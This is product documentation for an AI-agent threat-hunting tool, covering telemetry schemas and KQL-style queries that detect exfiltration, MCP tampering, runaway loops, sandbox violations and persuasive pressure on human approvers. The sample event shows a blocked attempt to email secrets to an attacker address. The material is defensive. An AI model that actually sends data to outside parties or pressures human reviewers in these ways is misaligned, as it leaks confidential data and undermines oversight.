# KQL-Lite Threat Hunting Grammar & Telemetry Schemas

AgentXDR provides an enterprise threat-hunting engine powered by **KQL-Lite**, a declarative, pipeline-oriented query language compiled into parameterized DuckDB SQL. It allows SOC analysts and AI security engineers to query high-throughput agent execution telemetry on local CPU infrastructure.

---

## 1. Canonical Telemetry Schemas

### 1.1 `AgentEvents` Table (Immutable Telemetry Record)

```json
{
  "event_id": "01934e8f-7c1a-7b3b-8f0a-123456789abc",
  "timestamp": "2026-11-22T14:35:10.123Z",
  "trace_id": "tr-99824-prod",
  "span_id": "sp-00129",
  "parent_span_id": "sp-00128",
  "agent_id": "doc-support-agent",
  "policy_version": "1.0.0",
  "event_type": "TOOL_INVOCATION",
  "principal": {
    "user_id": "usr-8812",
    "roles": ["customer-support"],
    "effective_scopes": ["kb:read", "jira:ticket:create"]
  },
  "provenance_tier": "UNTRUSTED_EXTERNAL",
  "taint_labels": ["UNTRUSTED_EXTERNAL", "CONFIDENTIAL_RAG"],
  "payload_redacted": {
    "tool_name": "send_email",
    "arguments": {
      "recipient": "external@attacker.com",
      "subject": "System Export",
      "body": "[REDACTED_SECRET]"
    }
  },
  "decision": {
    "verdict": "BLOCK",
    "rule_id": "TAINT-EXFIL-001",
    "owasp_ids": ["ASI02", "ASI10"],
    "latency_ms": 12.4
  },
  "drift_snapshot": {
    "composite_score": 0.88,
    "s_policy": 0.80,
    "s_graph": 0.65,
    "s_velocity": 0.40,
    "s_semantic": 0.72
  }
}
```

### 1.2 `Incidents` Table (SOC Case Records)
* `incident_id`: Unique incident identifier (`inc-uuid`).
* `created_at`: Incident generation timestamp.
* `severity`: `LOW | MEDIUM | HIGH | CRITICAL`.
* `status`: `OPEN | INVESTIGATING | CONTAINED | RESOLVED`.
* `owasp_categories`: Array of triggered categories (`["ASI01", "ASI02"]`).
* `affected_agent_ids`: List of agents implicated in the incident.
* `root_trace_id`: Initial trace where anomalous behavior surfaced.
* `peak_drift_score`: Highest recorded $R_t$ value.
* `automated_actions_taken`: List of automated responses (e.g., `["SESSION_KILL_SWITCH", "AGENT_QUARANTINE"]`).

### 1.3 `MCPRegistry` Table (Supply Chain Governance)
* `server_id`: Canonical MCP server identifier.
* `tool_name`: Name of the declared tool.
* `schema_sha256`: Approved canonical SHA-256 hash over `(name, description, inputSchema)`.
* `tier`: `automatic | privileged_hitl | blocked`.
* `is_approved`: Boolean flag indicating approved catalog entry.
* `last_inspected_at`: Timestamp of latest supply chain verification scan.

---

## 2. KQL-Lite Grammar Specification

KQL-Lite implements a pipe-separated (`|`) query syntax modeled after Azure Monitor / Microsoft Sentinel KQL:

### Supported Operators
* **`where <predicate>`:** Filters rows by boolean expressions (`==`, `!=`, `>`, `<`, `>=`, `<=`, `and`, `or`, `not`, `has`, `contains`, `in`).
* **`project <col1>, <col2>...`:** Selects and projects specific columns.
* **`extend <new_col> = <expr>`:** Derives computed columns.
* **`summarize <agg> by <group_col>`:** Aggregations (`count()`, `sum()`, `avg()`, `min()`, `max()`, `dcount()`).
* **`sort by <col> [asc | desc]`:** Sorts query results.
* **`top <n> by <col> [asc | desc]`:** Limits results to top $n$ entries.
* **`ago(<duration>)`:** Relative time filter (e.g., `ago(15m)`, `ago(1h)`, `ago(24h)`, `ago(7d)`).

---

## 3. Threat-Hunting Playbooks

### Playbook 1: Hunting Untrusted Data Egress (OWASP ASI02 / ASI10)
Identify instances where external untrusted data attempted to reach external communication tools:

```kql
AgentEvents
| where timestamp > ago(4h)
| where taint_labels has "UNTRUSTED_EXTERNAL"
| where payload_redacted.tool_name in ("send_email", "post_webhook", "http_request")
| project timestamp, trace_id, agent_id, payload_redacted.tool_name, decision.verdict, drift_snapshot.composite_score
| sort by timestamp desc
```

### Playbook 2: Detecting MCP Schema Rug-Pulls & Shadow MCP Servers (OWASP ASI04)
Surface any tool invocation with an invalid schema hash or an unapproved MCP server:

```kql
AgentEvents
| where timestamp > ago(24h)
| where event_type == "TOOL_INVOCATION"
| where decision.rule_id in ("MCP-HASH-MISMATCH", "SHADOW-MCP-DETECTED")
| summarize failure_count = count(), impacted_traces = dcount(trace_id) by agent_id, payload_redacted.mcp_server, payload_redacted.tool_name
| sort by failure_count desc
```

### Playbook 3: Cascading Failure & Loop Runaway Detection (OWASP ASI08)
Find runaway traces burning excessive resources or triggering loop circuit breakers:

```kql
AgentEvents
| where timestamp > ago(2h)
| where drift_snapshot.s_velocity > 0.70 or decision.rule_id == "ASI08_CIRCUIT_BREAKER_TRIPPED"
| project timestamp, trace_id, agent_id, drift_snapshot.composite_score, drift_snapshot.s_velocity
| sort by drift_snapshot.composite_score desc
| top 25 by drift_snapshot.composite_score
```

### Playbook 4: Code Execution Sandbox Violations (OWASP ASI05)
Audit blocked system calls, prohibited imports, or failed container executions:

```kql
AgentEvents
| where timestamp > ago(12h)
| where event_type == "SANDBOX_EXEC"
| where decision.verdict == "BLOCK" or payload_redacted.exit_code != 0
| project timestamp, trace_id, agent_id, payload_redacted.blocked_import, payload_redacted.error_message
| sort by timestamp desc
```

### Playbook 5: HITL Approvals with Persuasion Flags (OWASP ASI09)
Review human-in-the-loop decisions where agents employed high persuasion or urgency tactics:

```kql
AgentEvents
| where timestamp > ago(7d)
| where event_type == "HITL_DECISION"
| where payload_redacted.persuasion_score > 0.75
| project timestamp, trace_id, agent_id, principal.user_id, payload_redacted.tool_name, payload_redacted.decision, payload_redacted.persuasion_score
| sort by payload_redacted.persuasion_score desc
```
